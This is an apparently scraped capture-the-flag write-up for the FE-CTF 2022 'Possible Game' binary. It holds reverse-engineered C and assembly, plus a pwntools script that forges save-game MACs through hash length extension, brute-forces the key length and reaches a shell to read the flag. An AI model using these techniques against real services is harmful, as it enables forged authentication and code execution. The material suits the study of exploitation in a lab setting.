# FE-CTF 2022: Cyber Demon – Possible Game

> 原文: https://www.ctfiot.com/82140.html
> ID: 82140


```
$ ./game
open: No such file or directory
$ strace ./game
execve("./game", ["./game"], 0x7ffde7363300 /* 37 vars */) = 0
arch_prctl(ARCH_SET_FS, 0x7ffdf137a280) = 0
brk(NULL) = 0xede000
brk(0xedf000) = 0xedf000
open("/dev/urandom", O_RDONLY) = 3
open("secret_key", O_RDONLY) = -1 ENOENT (No such file or directory)
write(2, "open", 4open) = 4
write(2, ": ", 2: ) = 2
write(2, "No such file or directory", 25No such file or directory) = 25
write(2, "\n", 1
) = 1
exit(1) = ?
+++ exited with 1 +++
$ echo much secret > secret_key
pop rdi
mov rsi, rsp
push rdi
lea rdx, [rsi+rdi*8+8]
mov cs:
qword_40D340, rdx
call sub_4060AA
mov rdi, rax
call sub_408AA1
hlt
int __cdecl main(int argc, const char **argv, const char **envp) {
 sub_4068DD(off_40D0C0, 0LL, 0LL, 1024LL);
 sub_4068DD(off_40D140, 0LL, 0LL, 1024LL);
 sub_4068DD(off_40D040, 0LL, 0LL, 1024LL);
 dword_40D220 = sub_405D9B("/dev/urandom", 0LL);
 if ( dword_40D220 == -1 )
 {
 sub_405EBC("open", 0LL);
 result = 1;
 }
 else
 {
 sub_404D8C("/dev/urandom", 0LL);
 sub_405BD2("/dev/urandom");
 result = 0;
 }
 return result;
}
setvbuf(stdin, NULL, 0, _IONBF, BUFSIZ);
setvbuf(stdout, NULL, 0, _IONBF, BUFSIZ);
setvbuf(stderr, NULL, 0, _IONBF, BUFSIZ);
setbuf(stdin, NULL);
setbuf(stdout, NULL);
setbuf(stderr, NULL);
void __cdecl perror(const char *s)
{
 const char *s_beg;
 char *errstr;
 __int64 errno;
 signed __int64 s_len_ish;
 bool c;
 char *errstr_beg;
 signed __int64 errstr_len_ish;

 s_beg = s;
 errstr = "[unknown error]";
 errno = *MK_FP(__FS__, -4LL);
 if ( (unsigned int)errno <= 0x81 )
 errstr = strerror_list[errno];
 if ( s )
 {
 s_len_ish = -1LL;
 do
 {
 if ( !s_len_ish )
 break;
 c = *s++ == 0;
 --s_len_ish;
 }
 while ( !c );
 write(STDERR_FILENO, s_beg, ~s_len_ish - 1);
 write(STDERR_FILENO, ": ", 2uLL);
 }
 errstr_beg = errstr;
 errstr_len_ish = -1LL;
 do
 {
 if ( !errstr_len_ish )
 break;
 c = *errstr_beg++ == 0;
 --errstr_len_ish;
 }
 while ( !c );
 write(STDERR_FILENO, errstr, ~errstr_len_ish - 1);
 write(STDERR_FILENO, "\n", 1uLL);
}
<_exit>:
0x405d70: mov al, 0x3c
0x405d72: mov ah, 0 <-----.
[...] |
<write>: |
0x405da9: mov al, 1 |
0x405dab: jmp loc_405D72 ----'
:
0x405d9b: mov al, 2
0x405d9b: jmp 0x405d72 <syscall_0_255>
void __cdecl sub_404D8C(){
 int fd;
 int ret;

 fd = open("secret_key", 0);
 if ( fd == -1 )
 {
 perror("open");
 exit(1LL);
 }
 ret = sub_405DA2((unsigned int)fd, byte_40D240, 256LL);
 if ( ret == -1 )
 {
 perror("read");
 exit(1LL);
 }
 while ( byte_40D240[ret - 1] == 10 )
 --ret;
 byte_40D240[ret] = 0;
}
0x406796: printf
0x4064f3: fgets
0x405db0: atoi
0x40686b: puts
[...]
0x405c03: call show_menu
0x405c08: add eax, 1
0x405c0b: cmp eax, 6
0x405c0e: ja short loc_405bd6 ; loop back and show menu again
0x405c10: mov eax, eax
0x405c12: lea rdx, ds:0[rax*4]
0x405c1a: lea rax, main_menu_jump_table
0x405c21: mov eax, [rdx+rax]
0x405c24: cdqe
0x405c26: lea rdx, main_menu_jump_table
0x405c2d: add rax, rdx
0x405c30: jmp rax
<main_menu_new_game>:
0x405c32: mov eax, 0
0x405c37: call sub_405a95
0x405c3c: jmp short loc_405caf ------.
<main_menu_load_game>: |
0x405c3e: mov eax, 0 |
0x405c43: call sub_404e2c |
0x405c48: test al, al |
0x405c4a: jz short loc_405cae -----. |
0x405c4c: mov eax, 0 | |
0x405c51: call sub_405880 | |
0x405c56: jmp short loc_405cae ----.| |
<main_menu_cont_game>: | |
0x405c58: mov rax, cs:
qword_40d228 | |
0x405c5f: test rax, rax | |
0x405c62: jz short loc_405c70 --. | |
0x405c64: mov eax, 0 | | |
0x405c69: call sub_405880 | | |
0x405c6e: jmp short loc_405caf --+--+-.|
0x405c70: lea rdi, aNoGame <----' | | "No game"
0x405c77: call puts | |
0x405c7c: jmp short loc_405caf -----+-.|
<main_menu_hof>: | |
0x405c7e: lea rdi, aHallOfFame_0 | | "[~~~~ HALL OF FAME ~~~~]"
0x405c85: call puts | |
0x405c8a: lea rdi, aCatHall_of_fam | | "cat hall_of_fame.txt"
0x405c91: call sub_406a0a | |
0x405c96: lea rdi, asc_409436 | | "[~~~~~~~~~~~~~~~~~~~~~~~]" |
0x405c9d: call puts | |
0x405ca2: jmp short loc_405caf -----+-.|
<main_menu_quit>: | |
0x405ca4: mov edi, 0 | |
0x405ca9: call exit | |
0x405cae: nop <------------------' |
0x405caf: jmp loc_405bd6 <-----------'---> loop back and show menu again
[...]
0x405cb5: pop rbp
0x405cb6: retn
void *readlines() {
 size_t v0;
 int c;
 int sawnl;
 char *buf;
 size_t numb;
 size_t i;

 i = 0LL;
 numb = 0LL;
 buf = NULL;
 sawnl = 1;
 while ( 1 )
 {
 while ( 1 )
 {
 c = fgetc(stdin);
 if ( c != '\n' )
 break;
 if ( sawnl )
 goto LABEL_10;
 sawnl = 1;
 }
 if ( c == EOF )
 break;
 sawnl = 0;
 if ( i == numb )
 {
 numb += 256LL;
 buf = (char *)realloc(buf, numb);
 }
 v0 = i++;
 buf[v0] = c;
 }
LABEL_10:
 buf[i] = 0;
 return realloc(buf, i + 1);
}
$ ./game
 1. New game
 2. Load game
 3. Continue game
 4. Hall of Fame
 5. Quit
> 2
Enter saved game (end with a blank line):
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

MAC error
from hashpumpy import hashpump
from pwn import *

def mksock():
 return remote('possible.ctf', 1337)

# Obtain saved game
sock = mksock()
sock.sendline(b'1') # new game
sock.sendline(b'1') # easy
sock.sendline(b'4') # save game
sock.recvuntil(b'safe place:\n')
# Base 64 is split over two lines
save = sock.recvline().strip()
save += sock.recvline().strip()
sock.close()

# Extend saved game
def extend(extra):
 old_save = b64d(save)
 old_hash, old_data = old_save[:20], old_save[20:]
 new_hash_hex, new_data = hashpump(old_hash.hex(), old_data, extra, len_key)
 new_hash = bytes.fromhex(new_hash_hex)
 new_save = new_hash + new_data
 return b64e(new_save).encode()

# Load a saved game
def load(extra):
 sock.sendline(b'2') # load game
 sock.recvuntil(b'Enter saved game')
 sock.recvline()
 sock.sendline(extend(extra))
 sock.sendline(b'') # send blank line to end
 sock.sendline(b'n') # don't end current game

# Find secret key length
len_key = 0
with log.progress('Finding key length') as p:
 while True:
 with context.silent:
 sock = mksock()
 load(b'\0') # hashpumpy will not accept extra=b''
 line = sock.recvline()
 sock.close()
 if b'MAC error' not in line:
 break
 len_key += 1
 p.status(str(len_key))
 p.success(str(len_key))
$ python3 doit.py
[...]
[+] Finding key length: 64
# Calculate lengths and game data offset in extension
len_prefix = 20 + align(64, len(b64d(save)) - 20 + len_key + 9) - len_key
len_ext = int(514 - 1.75 * len_prefix)
len_b64 = (len_prefix + len_ext + 2) * 4 // 3
len_all = align(8, len_b64 + 1) + 8 + len_prefix
off_ext = 704 - len_all

info(f'|key| = {len_key}')
info(f'|prefix| = {len_prefix}')
info(f'|ext| = {len_ext}')
info(f'|base64| = {len_b64}')
info(f'|all|-|ext| = {len_all}')
info(f'game offset = {off_ext}')
$ python3 doit.py
[+] Opening connection to localhost on port 1337: Done
[*] Closed connection to localhost port 1337
[+] Finding key length: Done
[*] Found len(key) = 64
[*] |key| = 64
[*] |prefix| = 84
[*] |ext| = 367
[*] |base64| = 604
[*] |all|-|ext| = 700
[*] game offset = 4
[+] Opening connection to localhost on port 1337: Done
[*] Switching to interactive mode
$ cat flag
flag{no realloc, no problem!}
```
